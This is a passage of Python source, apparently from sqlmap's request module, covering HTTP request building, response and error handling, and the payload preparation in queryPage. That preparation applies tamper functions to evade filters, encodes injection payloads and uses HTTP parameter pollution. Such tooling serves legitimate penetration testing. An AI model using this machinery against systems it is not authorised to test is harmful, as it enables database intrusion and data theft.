HTTP_HEADER.CONTENT_TYPE):\n                headers[HTTP_HEADER.CONTENT_TYPE] = POST_HINT_CONTENT_TYPES.get(kb.postHint, DEFAULT_CONTENT_TYPE if unArrayizeValue(conf.base64Parameter) != HTTPMETHOD.POST else PLAIN_TEXT_CONTENT_TYPE)\n\n            if headers.get(HTTP_HEADER.CONTENT_TYPE) == POST_HINT_CONTENT_TYPES[POST_HINT.MULTIPART]:\n                warnMsg = \"missing 'boundary parameter' in '%s' header. \" % HTTP_HEADER.CONTENT_TYPE\n                warnMsg += \"Will try to reconstruct\"\n                singleTimeWarnMessage(warnMsg)\n\n                boundary = findMultipartPostBoundary(conf.data)\n                if boundary:\n                    headers[HTTP_HEADER.CONTENT_TYPE] = \"%s; boundary=%s\" % (headers[HTTP_HEADER.CONTENT_TYPE], boundary)\n\n            if conf.keepAlive:\n                headers[HTTP_HEADER.CONNECTION] = \"keep-alive\"\n\n            if chunked:\n                headers[HTTP_HEADER.TRANSFER_ENCODING] = \"chunked\"\n\n            if auxHeaders:\n                headers = forgeHeaders(auxHeaders, headers)\n\n            if kb.headersFile:\n                content = openFile(kb.headersFile, \"rb\").read()\n                for line in content.split(\"\\n\"):\n                    line = getText(line.strip())\n                    if ':' in line:\n                        header, value = line.split(':', 1)\n                        headers[header] = value\n\n            if conf.localhost:\n                headers[HTTP_HEADER.HOST] = \"localhost\"\n\n            for key, value in list(headers.items()):\n                if key.upper() == HTTP_HEADER.ACCEPT_ENCODING.upper():\n                    value = re.sub(r\"(?i)(,)br(,)?\", lambda match: ',' if match.group(1) and match.group(2) else \"\", value) or \"identity\"\n\n                del headers[key]\n                if isinstance(value, six.string_types):\n                    for char in (r\"\\r\", r\"\\n\"):\n                        value = re.sub(r\"(%s)([^ \\t])\" % char, r\"\\g<1>\\t\\g<2>\", value)\n                    headers[getBytes(key) if six.PY2 else key] = getBytes(value.strip(\"\\r\\n\"))  # Note: Python3 has_header() expects non-bytes value\n\n            if six.PY2:\n                url = getBytes(url)  # Note: Python3 requires text while Python2 has problems when mixing text with binary POST\n\n            if webSocket:\n                ws = websocket.WebSocket()\n                ws.settimeout(WEBSOCKET_INITIAL_TIMEOUT if kb.webSocketRecvCount is None else timeout)\n                ws.connect(url, header=(\"%s: %s\" % _ for _ in headers.items() if _[0] not in (\"Host\",)), cookie=cookie)  # WebSocket will add Host field of headers automatically\n                ws.send(urldecode(post or \"\"))\n\n                _page = []\n\n                if kb.webSocketRecvCount is None:\n                    while True:\n                        try:\n                            _page.append(ws.recv())\n                        except websocket.WebSocketTimeoutException:\n                            kb.webSocketRecvCount = len(_page)\n                            break\n                else:\n                    for i in xrange(max(1, kb.webSocketRecvCount)):\n                        _page.append(ws.recv())\n\n                page = \"\\n\".join(_page)\n\n                ws.close()\n                code = ws.status\n                status = _http_client.responses[code]\n\n                class _(dict):\n                    pass\n\n                responseHeaders = _(ws.getheaders())\n                responseHeaders.headers = [\"%s: %s\\r\\n\" % (_[0].capitalize(), _[1]) for _ in responseHeaders.items()]\n\n                requestHeaders += \"\\r\\n\".join([\"%s: %s\" % (u\"-\".join(_.capitalize() for _ in getUnicode(key).split(u'-')) if hasattr(key, \"capitalize\") else getUnicode(key), getUnicode(value)) for (key, value) in responseHeaders.items()])\n                requestMsg += \"\\r\\n%s\" % requestHeaders\n\n                if post is not None:\n                    requestMsg += \"\\r\\n\\r\\n%s\" % getUnicode(post)\n\n                requestMsg += \"\\r\\n\"\n\n                threadData.lastRequestMsg = requestMsg\n\n                logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)\n            else:\n                post = getBytes(post)\n\n                if unArrayizeValue(conf.base64Parameter) == HTTPMETHOD.POST:\n                    if kb.place != HTTPMETHOD.POST:\n                        conf.data = getattr(conf.data, UNENCODED_ORIGINAL_VALUE, conf.data)\n                    else:\n                        post = urldecode(post, convall=True)\n                        post = encodeBase64(post)\n\n                if target and cmdLineOptions.method or method and method not in (HTTPMETHOD.GET, HTTPMETHOD.POST):\n                    req = MethodRequest(url, post, headers)\n                    req.set_method(cmdLineOptions.method or method)\n                elif url is not None:\n                    req = _urllib.request.Request(url, post, headers)\n                else:\n                    return None, None, None\n\n                for function in kb.preprocessFunctions:\n                    try:\n                        function(req)\n                    except Exception as ex:\n                        errMsg = \"error occurred while running preprocess \"\n                        errMsg += \"function '%s' ('%s')\" % (function.__name__, getSafeExString(ex))\n                        raise SqlmapGenericException(errMsg)\n                    else:\n                        post, headers = req.data, req.headers\n\n                requestHeaders += \"\\r\\n\".join([\"%s: %s\" % (u\"-\".join(_.capitalize() for _ in getUnicode(key).split(u'-')) if hasattr(key, \"capitalize\") else getUnicode(key), getUnicode(value)) for (key, value) in req.header_items()])\n\n                if not getRequestHeader(req, HTTP_HEADER.COOKIE) and conf.cj:\n                    conf.cj._policy._now = conf.cj._now = int(time.time())\n                    with conf.cj._cookies_lock:\n                        cookies = conf.cj._cookies_for_request(req)\n                    requestHeaders += \"\\r\\n%s\" % (\"Cookie: %s\" % \";\".join(\"%s=%s\" % (getUnicode(cookie.name), getUnicode(cookie.value)) for cookie in cookies))\n\n                if post is not None:\n                    if not getRequestHeader(req, HTTP_HEADER.CONTENT_LENGTH) and not chunked:\n                        requestHeaders += \"\\r\\n%s: %d\" % (string.capwords(HTTP_HEADER.CONTENT_LENGTH), len(post))\n\n                if not getRequestHeader(req, HTTP_HEADER.CONNECTION):\n                    requestHeaders += \"\\r\\n%s: %s\" % (HTTP_HEADER.CONNECTION, \"close\" if not conf.keepAlive else \"keep-alive\")\n\n                requestMsg += \"\\r\\n%s\" % requestHeaders\n\n                if post is not None:\n                    requestMsg += \"\\r\\n\\r\\n%s\" % getUnicode(post)\n\n                if not chunked:\n                    requestMsg += \"\\r\\n\"\n\n                if not multipart:\n                    threadData.lastRequestMsg = requestMsg\n\n                    logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)\n\n                if conf.cj:\n                    for cookie in conf.cj:\n                        if cookie.value is None:\n                            cookie.value = \"\"\n                        else:\n                            for char in (r\"\\r\", r\"\\n\"):\n                                cookie.value = re.sub(r\"(%s)([^ \\t])\" % char, r\"\\g<1>\\t\\g<2>\", cookie.value)\n\n                conn = _urllib.request.urlopen(req)\n\n                if not kb.authHeader and getRequestHeader(req, HTTP_HEADER.AUTHORIZATION) and (conf.authType or \"\").lower() == AUTH_TYPE.BASIC.lower():\n                    kb.authHeader = getUnicode(getRequestHeader(req, HTTP_HEADER.AUTHORIZATION))\n\n                if not kb.proxyAuthHeader and getRequestHeader(req, HTTP_HEADER.PROXY_AUTHORIZATION):\n                    kb.proxyAuthHeader = getRequestHeader(req, HTTP_HEADER.PROXY_AUTHORIZATION)\n\n                # Return response object\n                if response:\n                    return conn, None, None\n\n                # Get HTTP response\n                if hasattr(conn, \"redurl\"):\n                    page = (threadData.lastRedirectMsg[1] if kb.choices.redirect == REDIRECTION.NO else Connect._connReadProxy(conn)) if not skipRead else None\n                    skipLogTraffic = kb.choices.redirect == REDIRECTION.NO\n                    code = conn.redcode if not finalCode else code\n                else:\n                    page = Connect._connReadProxy(conn) if not skipRead else None\n\n                if conn:\n                    code = (code or conn.code) if conn.code == kb.originalCode else conn.code  # do not override redirection code (for comparison purposes)\n                    responseHeaders = conn.info()\n                    responseHeaders[URI_HTTP_HEADER] = conn.geturl() if hasattr(conn, \"geturl\") else url\n\n                    if getattr(conn, \"redurl\", None) is not None:\n                        responseHeaders[HTTP_HEADER.LOCATION] = conn.redurl\n\n                    responseHeaders = patchHeaders(responseHeaders)\n                    kb.serverHeader = responseHeaders.get(HTTP_HEADER.SERVER, kb.serverHeader)\n                else:\n                    code = None\n                    responseHeaders = {}\n\n                page = decodePage(page, responseHeaders.get(HTTP_HEADER.CONTENT_ENCODING), responseHeaders.get(HTTP_HEADER.CONTENT_TYPE), percentDecode=not crawling)\n                status = getUnicode(conn.msg) if conn and getattr(conn, \"msg\", None) else None\n\n            kb.connErrorCounter = 0\n\n            if not refreshing:\n                refresh = responseHeaders.get(HTTP_HEADER.REFRESH, \"\").split(\"url=\")[-1].strip()\n\n                if extractRegexResult(META_REFRESH_REGEX, page):\n                    refresh = extractRegexResult(META_REFRESH_REGEX, page)\n\n                    debugMsg = \"got HTML meta refresh header\"\n                    logger.debug(debugMsg)\n\n                if not refresh:\n                    refresh = extractRegexResult(JAVASCRIPT_HREF_REGEX, page)\n\n                    if refresh:\n                        debugMsg = \"got Javascript redirect logic\"\n                        logger.debug(debugMsg)\n\n                if refresh:\n                    if kb.alwaysRefresh is None:\n                        msg = \"got a refresh intent \"\n                        msg += \"(redirect like response common to login pages) to '%s'. \" % refresh\n                        msg += \"Do you want to apply it from now on? [Y/n]\"\n\n                        kb.alwaysRefresh = readInput(msg, default='Y', boolean=True)\n\n                    if kb.alwaysRefresh:\n                        if re.search(r\"\\Ahttps?://\", refresh, re.I):\n                            url = refresh\n                        else:\n                            url = _urllib.parse.urljoin(url, refresh)\n\n                        threadData.lastRedirectMsg = (threadData.lastRequestUID, page)\n                        kwargs[\"refreshing\"] = True\n                        kwargs[\"url\"] = url\n                        kwargs[\"get\"] = None\n                        kwargs[\"post\"] = None\n\n                        try:\n                            return Connect._getPageProxy(**kwargs)\n                        except SqlmapSyntaxException:\n                            pass\n\n            # Explicit closing of connection object\n            if conn and not conf.keepAlive:\n                try:\n                    if hasattr(conn.fp, '_sock'):\n                        conn.fp._sock.close()\n                    conn.close()\n                except Exception as ex:\n                    warnMsg = \"problem occurred during connection closing ('%s')\" % getSafeExString(ex)\n                    logger.warning(warnMsg)\n\n        except SqlmapConnectionException as ex:\n            if conf.proxyList and not kb.threadException:\n                warnMsg = \"unable to connect to the target URL ('%s')\" % getSafeExString(ex)\n                logger.critical(warnMsg)\n                threadData.retriesCount = conf.retries\n                return Connect._retryProxy(**kwargs)\n            else:\n                raise\n\n        except _urllib.error.HTTPError as ex:\n            page = None\n            responseHeaders = None\n\n            if checking:\n                return None, None, None\n\n            try:\n                page = ex.read() if not skipRead else None\n                responseHeaders = ex.info()\n                responseHeaders[URI_HTTP_HEADER] = ex.geturl()\n                responseHeaders = patchHeaders(responseHeaders)\n                page = decodePage(page, responseHeaders.get(HTTP_HEADER.CONTENT_ENCODING), responseHeaders.get(HTTP_HEADER.CONTENT_TYPE), percentDecode=not crawling)\n            except socket.timeout:\n                warnMsg = \"connection timed out while trying \"\n                warnMsg += \"to get error page information (%d)\" % ex.code\n                logger.warning(warnMsg)\n                return None, None, None\n            except KeyboardInterrupt:\n                raise\n            except:\n                pass\n            finally:\n                page = getUnicode(page)\n\n            code = ex.code\n            status = getUnicode(getattr(ex, \"reason\", None) or getSafeExString(ex).split(\": \", 1)[-1])\n\n            kb.originalCode = kb.originalCode or code\n            threadData.lastHTTPError = (threadData.lastRequestUID, code, status)\n            kb.httpErrorCodes[code] = kb.httpErrorCodes.get(code, 0) + 1\n\n            responseMsg += \"[#%d] (%s %s):\\r\\n\" % (threadData.lastRequestUID, code, status)\n\n            if responseHeaders and getattr(responseHeaders, \"headers\", None):\n                logHeaders = \"\".join(getUnicode(responseHeaders.headers)).strip()\n\n            logHTTPTraffic(requestMsg, \"%s%s\\r\\n\\r\\n%s\" % (responseMsg, logHeaders, (page or \"\")[:MAX_CONNECTION_READ_SIZE]), start, time.time())\n\n            skipLogTraffic = True\n\n            if conf.verbose <= 5:\n                responseMsg += getUnicode(logHeaders)\n            elif conf.verbose > 5:\n                responseMsg += \"%s\\r\\n\\r\\n%s\" % (logHeaders, (page or \"\")[:MAX_CONNECTION_READ_SIZE])\n\n            if not multipart:\n                logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)\n\n            if code in conf.abortCode:\n                errMsg = \"aborting due to detected HTTP code '%d'\" % code\n                singleTimeLogMessage(errMsg, logging.CRITICAL)\n                raise SystemExit\n\n            if ex.code not in (conf.ignoreCode or []):\n                if ex.code == _http_client.UNAUTHORIZED:\n                    errMsg = \"not authorized, try to provide right HTTP \"\n                    errMsg += \"authentication type and valid credentials (%d). \" % code\n                    errMsg += \"If this is intended, try to rerun by providing \"\n                    errMsg += \"a valid value for option '--ignore-code'\"\n                    raise SqlmapConnectionException(errMsg)\n                elif chunked and ex.code in (_http_client.METHOD_NOT_ALLOWED, _http_client.LENGTH_REQUIRED):\n                    warnMsg = \"turning off HTTP chunked transfer encoding \"\n                    warnMsg += \"as it seems that the target site doesn't support it (%d)\" % code\n                    singleTimeWarnMessage(warnMsg)\n                    conf.chunked = kwargs[\"chunked\"] = False\n                    return Connect.getPage(**kwargs)\n                elif ex.code == _http_client.REQUEST_URI_TOO_LONG:\n                    warnMsg = \"request URI is marked as too long by the target. \"\n                    warnMsg += \"you are advised to try a switch '--no-cast' and/or '--no-escape'\"\n                    singleTimeWarnMessage(warnMsg)\n                elif ex.code == _http_client.NOT_FOUND:\n                    if raise404:\n                        errMsg = \"page not found (%d)\" % code\n                        raise SqlmapConnectionException(errMsg)\n                    else:\n                        debugMsg = \"page not found (%d)\" % code\n                        singleTimeLogMessage(debugMsg, logging.DEBUG)\n                elif ex.code == _http_client.GATEWAY_TIMEOUT:\n                    if ignoreTimeout:\n                        return None if not conf.ignoreTimeouts else \"\", None, None\n                    else:\n                        warnMsg = \"unable to connect to the target URL (%d - %s)\" % (ex.code, _http_client.responses[ex.code])\n                        if threadData.retriesCount < conf.retries and not kb.threadException:\n                            warnMsg += \". sqlmap is going to retry the request\"\n                            logger.critical(warnMsg)\n                            return Connect._retryProxy(**kwargs)\n                        elif kb.testMode:\n                            logger.critical(warnMsg)\n                            return None, None, None\n                        else:\n                            raise SqlmapConnectionException(warnMsg)\n                else:\n                    debugMsg = \"got HTTP error code: %d ('%s')\" % (code, status)\n                    logger.debug(debugMsg)\n\n        except (_urllib.error.URLError, socket.error, socket.timeout, _http_client.HTTPException, struct.error, binascii.Error, ProxyError, SqlmapCompressionException, WebSocketException, TypeError, ValueError, OverflowError, AttributeError, OSError, AssertionError, KeyError):\n            tbMsg = traceback.format_exc()\n\n            if conf.debug:\n                dataToStdout(tbMsg)\n\n            if checking:\n                return None, None, None\n            elif \"KeyError:\" in tbMsg:\n                if \"content-length\" in tbMsg:\n                    return None, None, None\n                else:\n                    raise\n            elif \"AttributeError:\" in tbMsg:\n                if \"WSAECONNREFUSED\" in tbMsg:\n                    return None, None, None\n                else:\n                    raise\n            elif \"no host given\" in tbMsg:\n                warnMsg = \"invalid URL address used (%s)\" % repr(url)\n                raise SqlmapSyntaxException(warnMsg)\n            elif any(_ in tbMsg for _ in (\"forcibly closed\", \"Connection is already closed\", \"ConnectionAbortedError\")):\n                warnMsg = \"connection was forcibly closed by the target URL\"\n            elif \"timed out\" in tbMsg:\n                if kb.testMode and kb.testType not in (None, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED):\n                    singleTimeWarnMessage(\"there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests\")\n                    kb.droppingRequests = True\n                warnMsg = \"connection timed out to the target URL\"\n            elif \"Connection reset\" in tbMsg:\n                if not conf.disablePrecon:\n                    singleTimeWarnMessage(\"turning off pre-connect mechanism because of connection reset(s)\")\n                    conf.disablePrecon = True\n\n                if kb.testMode:\n                    singleTimeWarnMessage(\"there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests\")\n                    kb.droppingRequests = True\n                warnMsg = \"connection reset to the target URL\"\n            elif \"URLError\" in tbMsg or \"error\" in tbMsg:\n                warnMsg = \"unable to connect to the target URL\"\n                match = re.search(r\"Errno \\d+\\] ([^>\\n]+)\", tbMsg)\n                if match:\n                    warnMsg += \" ('%s')\" % match.group(1).strip()\n            elif \"NTLM\" in tbMsg:\n                warnMsg = \"there has been a problem with NTLM authentication\"\n            elif \"Invalid header name\" in tbMsg:  # (e.g. PostgreSQL ::Text payload)\n                return None, None, None\n            elif \"BadStatusLine\" in tbMsg:\n                warnMsg = \"connection dropped or unknown HTTP \"\n                warnMsg += \"status code received\"\n                if not conf.agent and not conf.randomAgent:\n                    warnMsg += \". Try to force the HTTP User-Agent \"\n                    warnMsg += \"header with option '--user-agent' or switch '--random-agent'\"\n            elif \"IncompleteRead\" in tbMsg:\n                warnMsg = \"there was an incomplete read error while retrieving data \"\n                warnMsg += \"from the target URL\"\n            elif \"Handshake status\" in tbMsg:\n                status = re.search(r\"Handshake status ([\\d]{3})\", tbMsg)\n                errMsg = \"websocket handshake status %s\" % status.group(1) if status else \"unknown\"\n                raise SqlmapConnectionException(errMsg)\n            elif \"SqlmapCompressionException\" in tbMsg:\n                warnMsg = \"problems with response (de)compression\"\n                retrying = True\n            else:\n                warnMsg = \"unable to connect to the target URL\"\n\n            if \"BadStatusLine\" not in tbMsg and any((conf.proxy, conf.tor)):\n                warnMsg += \" or proxy\"\n\n            if silent:\n                return None, None, None\n\n            with kb.locks.connError:\n                kb.connErrorCounter += 1\n\n                if kb.connErrorCounter >= MAX_CONSECUTIVE_CONNECTION_ERRORS and kb.choices.connError is None:\n                    message = \"there seems to be a continuous problem with connection to the target. \"\n                    message += \"Are you sure that you want to continue? [y/N] \"\n\n                    kb.choices.connError = readInput(message, default='N', boolean=True)\n\n                if kb.choices.connError is False:\n                    raise SqlmapSkipTargetException\n\n            if \"forcibly closed\" in tbMsg:\n                logger.critical(warnMsg)\n                return None, None, None\n            elif ignoreTimeout and any(_ in tbMsg for _ in (\"timed out\", \"IncompleteRead\", \"Interrupted system call\")):\n                return None if not conf.ignoreTimeouts else \"\", None, None\n            elif threadData.retriesCount < conf.retries and not kb.threadException:\n                warnMsg += \". sqlmap is going to retry the request\"\n                if not retrying:\n                    warnMsg += \"(s)\"\n                    logger.critical(warnMsg)\n                else:\n                    logger.debug(warnMsg)\n                return Connect._retryProxy(**kwargs)\n            elif kb.testMode or kb.multiThreadMode:\n                logger.critical(warnMsg)\n                return None, None, None\n            else:\n                raise SqlmapConnectionException(warnMsg)\n\n        finally:\n            for function in kb.postprocessFunctions:\n                try:\n                    page, responseHeaders, code = function(page, responseHeaders, code)\n                except Exception as ex:\n                    errMsg = \"error occurred while running postprocess \"\n                    errMsg += \"function '%s' ('%s')\" % (function.__name__, getSafeExString(ex))\n                    raise SqlmapGenericException(errMsg)\n\n            if isinstance(page, six.binary_type):\n                if HTTP_HEADER.CONTENT_TYPE in (responseHeaders or {}) and not re.search(TEXT_CONTENT_TYPE_REGEX, responseHeaders[HTTP_HEADER.CONTENT_TYPE]):\n                    page = six.text_type(page, errors=\"ignore\")\n                else:\n                    page = getUnicode(page)\n\n            for _ in (getattr(conn, \"redcode\", None), code):\n                if _ is not None and _ in conf.abortCode:\n                    errMsg = \"aborting due to detected HTTP code '%d'\" % _\n                    singleTimeLogMessage(errMsg, logging.CRITICAL)\n                    raise SystemExit\n\n            threadData.lastPage = page\n            threadData.lastCode = code\n\n            socket.setdefaulttimeout(conf.timeout)\n\n        # Dirty patch for Python3.11.0a7 (e.g. https://github.com/sqlmapproject/sqlmap/issues/5091)\n        if not sys.version.startswith(\"3.11.\"):\n            if conf.retryOn and re.search(conf.retryOn, page, re.I):\n                if threadData.retriesCount < conf.retries:\n                    warnMsg = \"forced retry of the request because of undesired page content\"\n                    logger.warning(warnMsg)\n                    return Connect._retryProxy(**kwargs)\n\n        processResponse(page, responseHeaders, code, status)\n\n        if not skipLogTraffic:\n            if conn and getattr(conn, \"redurl\", None):\n                _ = _urllib.parse.urlsplit(conn.redurl)\n                _ = (\"%s%s\" % (_.path or \"/\", (\"?%s\" % _.query) if _.query else \"\"))\n                requestMsg = re.sub(r\"(\\n[A-Z]+ ).+?( HTTP/\\d)\", r\"\\g<1>%s\\g<2>\" % getUnicode(_).replace(\"\\\\\", \"\\\\\\\\\"), requestMsg, 1)\n\n                if kb.resendPostOnRedirect is False:\n                    requestMsg = re.sub(r\"(\\[#\\d+\\]:\\n)POST \", r\"\\g<1>GET \", requestMsg)\n                    requestMsg = re.sub(r\"(?i)Content-length: \\d+\\n\", \"\", requestMsg)\n                    requestMsg = re.sub(r\"(?s)\\n\\n.+\", \"\\n\", requestMsg)\n\n                responseMsg += \"[#%d] (%s %s):\\r\\n\" % (threadData.lastRequestUID, conn.code, status)\n            elif \"\\n\" not in responseMsg:\n                responseMsg += \"[#%d] (%s %s):\\r\\n\" % (threadData.lastRequestUID, code, status)\n\n            if responseHeaders:\n                logHeaders = \"\".join(getUnicode(responseHeaders.headers)).strip()\n\n            logHTTPTraffic(requestMsg, \"%s%s\\r\\n\\r\\n%s\" % (responseMsg, logHeaders, (page or \"\")[:MAX_CONNECTION_READ_SIZE]), start, time.time())\n\n            if conf.verbose <= 5:\n                responseMsg += getUnicode(logHeaders)\n            elif conf.verbose > 5:\n                responseMsg += \"%s\\r\\n\\r\\n%s\" % (logHeaders, (page or \"\")[:MAX_CONNECTION_READ_SIZE])\n\n            if not multipart:\n                logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)\n\n        return page, responseHeaders, code\n\n    @staticmethod\n    @stackedmethod\n    def queryPage(value=None, place=None, content=False, getRatioValue=False, silent=False, method=None, timeBasedCompare=False, noteResponseTime=True, auxHeaders=None, response=False, raise404=None, removeReflection=True, disableTampering=False, ignoreSecondOrder=False):\n        \"\"\"\n        This method calls a function to get the target URL page content\n        and returns its page ratio (0 <= ratio <= 1) or a boolean value\n        representing False/True match in case of !getRatioValue\n        \"\"\"\n\n        if conf.direct:\n            return direct(value, content)\n\n        get = None\n        post = None\n        cookie = None\n        ua = None\n        referer = None\n        host = None\n        page = None\n        pageLength = None\n        uri = None\n        code = None\n\n        if not place:\n            place = kb.injection.place or PLACE.GET\n\n        kb.place = place\n\n        if not auxHeaders:\n            auxHeaders = {}\n\n        raise404 = place != PLACE.URI if raise404 is None else raise404\n        method = method or conf.method\n\n        postUrlEncode = kb.postUrlEncode\n\n        value = agent.adjustLateValues(value)\n        payload = agent.extractPayload(value)\n        threadData = getCurrentThreadData()\n\n        if conf.httpHeaders:\n            headers = OrderedDict(conf.httpHeaders)\n            contentType = max(headers[_] or \"\" if _.upper() == HTTP_HEADER.CONTENT_TYPE.upper() else \"\" for _ in headers) or None\n\n            if (kb.postHint or conf.skipUrlEncode) and postUrlEncode:\n                postUrlEncode = False\n                if not (conf.skipUrlEncode and contentType):    # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5092\n                    conf.httpHeaders = [_ for _ in conf.httpHeaders if _[1] != contentType]\n                    contentType = POST_HINT_CONTENT_TYPES.get(kb.postHint, PLAIN_TEXT_CONTENT_TYPE)\n                    conf.httpHeaders.append((HTTP_HEADER.CONTENT_TYPE, contentType))\n                    if \"urlencoded\" in contentType:\n                        postUrlEncode = True\n\n        if payload:\n            delimiter = conf.paramDel or (DEFAULT_GET_POST_DELIMITER if place != PLACE.COOKIE else DEFAULT_COOKIE_DELIMITER)\n\n            if not disableTampering and kb.tamperFunctions:\n                for function in kb.tamperFunctions:\n                    hints = {}\n\n                    try:\n                        payload = function(payload=payload, headers=auxHeaders, delimiter=delimiter, hints=hints)\n                    except Exception as ex:\n                        errMsg = \"error occurred while running tamper \"\n                        errMsg += \"function '%s' ('%s')\" % (function.__name__, getSafeExString(ex))\n                        raise SqlmapGenericException(errMsg)\n\n                    if not isinstance(payload, six.string_types):\n                        errMsg = \"tamper function '%s' returns \" % function.__name__\n                        errMsg += \"invalid payload type ('%s')\" % type(payload)\n                        raise SqlmapValueException(errMsg)\n\n                value = agent.replacePayload(value, payload)\n\n                if hints:\n                    if HINT.APPEND in hints:\n                        value = \"%s%s%s\" % (value, delimiter, hints[HINT.APPEND])\n\n                    if HINT.PREPEND in hints:\n                        if place == PLACE.URI:\n                            match = re.search(r\"\\w+\\s*=\\s*%s\" % PAYLOAD_DELIMITER, value) or re.search(r\"[^?%s/]=\\s*%s\" % (re.escape(delimiter), PAYLOAD_DELIMITER), value)\n                            if match:\n                                value = value.replace(match.group(0), \"%s%s%s\" % (hints[HINT.PREPEND], delimiter, match.group(0)))\n                        else:\n                            value = \"%s%s%s\" % (hints[HINT.PREPEND], delimiter, value)\n\n            logger.log(CUSTOM_LOGGING.PAYLOAD, safecharencode(payload.replace('\\\\', BOUNDARY_BACKSLASH_MARKER)).replace(BOUNDARY_BACKSLASH_MARKER, '\\\\'))\n\n            if place == PLACE.CUSTOM_POST and kb.postHint:\n                if kb.postHint in (POST_HINT.SOAP, POST_HINT.XML):\n                    # payloads in SOAP/XML should have chars > and < replaced\n                    # with their HTML encoded counterparts\n                    payload = payload.replace(\"&#\", SAFE_HEX_MARKER)\n                    payload = payload.replace('&', \"&amp;\").replace('>', \"&gt;\").replace('<', \"&lt;\").replace('\"', \"&quot;\").replace(\"'\", \"&apos;\")  # Reference: https://stackoverflow.com/a/1091953\n                    payload = payload.replace(SAFE_HEX_MARKER, \"&#\")\n                elif kb.postHint == POST_HINT.JSON:\n                    payload = escapeJsonValue(payload)\n                elif kb.postHint == POST_HINT.JSON_LIKE:\n                    payload = payload.replace(\"'\", REPLACEMENT_MARKER).replace('\"', \"'\").replace(REPLACEMENT_MARKER, '\"')\n                    payload = escapeJsonValue(payload)\n                    payload = payload.replace(\"'\", REPLACEMENT_MARKER).replace('\"', \"'\").replace(REPLACEMENT_MARKER, '\"')\n                value = agent.replacePayload(value, payload)\n            else:\n                # GET, POST, URI and Cookie payload needs to be thoroughly URL encoded\n                if (place in (PLACE.GET, PLACE.URI, PLACE.COOKIE) or place == PLACE.CUSTOM_HEADER and value.split(',')[0].upper() == HTTP_HEADER.COOKIE.upper()) and not conf.skipUrlEncode or place in (PLACE.POST, PLACE.CUSTOM_POST) and postUrlEncode:\n                    skip = False\n\n                    if place == PLACE.COOKIE or place == PLACE.CUSTOM_HEADER and value.split(',')[0].upper() == HTTP_HEADER.COOKIE.upper():\n                        if kb.choices.cookieEncode is None:\n                            msg = \"do you want to URL encode cookie values (implementation specific)? %s\" % (\"[Y/n]\" if not conf.url.endswith(\".aspx\") else \"[y/N]\")  # Reference: https://support.microsoft.com/en-us/kb/313282\n                            kb.choices.cookieEncode = readInput(msg, default='Y' if not conf.url.endswith(\".aspx\") else 'N', boolean=True)\n                        if not kb.choices.cookieEncode:\n                            skip = True\n\n                    if not skip:\n                        if place in (PLACE.POST, PLACE.CUSTOM_POST):  # potential problems in other cases (e.g. URL encoding of whole URI - including path)\n                            value = urlencode(value, spaceplus=kb.postSpaceToPlus)\n                        payload = urlencode(payload, safe='%', spaceplus=kb.postSpaceToPlus)\n                        value = agent.replacePayload(value, payload)\n                        postUrlEncode = False\n\n            if conf.hpp:\n                if not any(conf.url.lower().endswith(_.lower()) for _ in (WEB_PLATFORM.ASP, WEB_PLATFORM.ASPX)):\n                    warnMsg = \"HTTP parameter pollution should work only against \"\n                    warnMsg += \"ASP(.NET) targets\"\n                    singleTimeWarnMessage(warnMsg)\n                if place in (PLACE.GET, PLACE.POST):\n                    _ = re.escape(PAYLOAD_DELIMITER)\n                    match = re.search(r\"(?P<name>\\w+)=%s(?P<value>.+?)%s\" % (_, _), value)\n                    if match:\n                        payload = match.group(\"value\")\n\n                        for splitter in (urlencode(' '), ' '):\n                            if splitter in payload:\n                                prefix, suffix = (\"*/\", \"/*\") if splitter == ' ' else (urlencode(_) for _ in (\"*/\", \"/*\"))\n                                parts = payload.split(splitter)\n                                parts[0] = \"%s%s\" % (parts[0], suffix)\n                                parts[-1] = \"%s%s=%s%s\" % (DEFAULT_GET_POST_DELIMITER, match.group(\"name\"), prefix, parts[-1])\n                                for i in xrange(1, len(parts) - 1):\n                                    parts[i] = \"%s%s=%s%s%s\" % (DEFAULT_GET_POST_DELIMITER, match.group(\"name\"), prefix, parts[i], suffix)\n                                payload = \"\".join(parts)\n\n                        for splitter in (urlencode(','), ','):\n                            payload = payload.replace(splitter, \"%s%s=\" % (DEFAULT_GET_POST_DELIMITER, match.group(\"name\")))\n\n                        value = agent.replacePayload(value, payload)\n                else:\n                    warnMsg = \"HTTP parameter pollution works only with regular \"\n                    warnMsg += \"GET and POST parameters\"\n                    singleTimeWarnMessage(warnMsg)\n\n        if place:\n            value = agent.removePayloadDelimiters(value)\n\n        if PLACE.GET in conf.parameters:\n            get = conf.parameters[PLACE.GET] if place != PLACE.GET or not value else value\n        elif place == PLACE.GET:  # Note: for (e.g.) checkWaf() when there are no GET parameters\n            get = value\n\n        if PLACE.POST in conf.parameters:\n            post = conf.parameters[PLACE.POST] if place != PLACE.POST or not value else value\n        elif place == PLACE.POST:\n            post = value\n\n        if PLACE.CUSTOM_POST in conf.parameters:\n            post = conf.parameters[PLACE.CUSTOM_POST].replace(kb.customInjectionMark, \"\") if place != PLACE.CUSTOM_POST or not value else value\n            post = post.replace(ASTERISK_MARKER, '*') if post else post\n\n        if PLACE.COOKIE in conf.parameters:\n            cookie = conf.parameters[PLACE.COOKIE] if place != PLACE.COOKIE or not value else value\n\n        if PLACE.USER_AGENT in conf.parameters:\n            ua = conf.parameters[PLACE.USER_AGENT] if place != PLACE.USER_AGENT or not value else value\n\n        if PLACE.REFERER in conf.parameters:\n            referer = conf.parameters[PLACE.REFERER] if place != PLACE.REFERER or not value else value\n\n        if PLACE.HOST in conf.parameters:\n            host = conf.parameters[PLACE.HOST] if place != PLACE.HOST or not value else value\n\n        if PLACE.URI in conf.parameters:\n            uri = conf.url if place != PLACE.URI or not value else value\n        else:\n            uri = conf.url\n\n        if value and place == PLACE.CUSTOM_HEADER:\n            if value.split(',')[0].capitalize() == PLACE.COOKIE:\n                cookie = value.split(',', 1)[-1]\n            else:\n                auxHeaders[value.split(',')[0]] = value.split(',', 1)[-1]\n\n        if conf.csrfToken:\n            token = AttribDict()\n\n            def _adjustParameter(paramString, parameter, newValue):\n                retVal = paramString\n\n                if 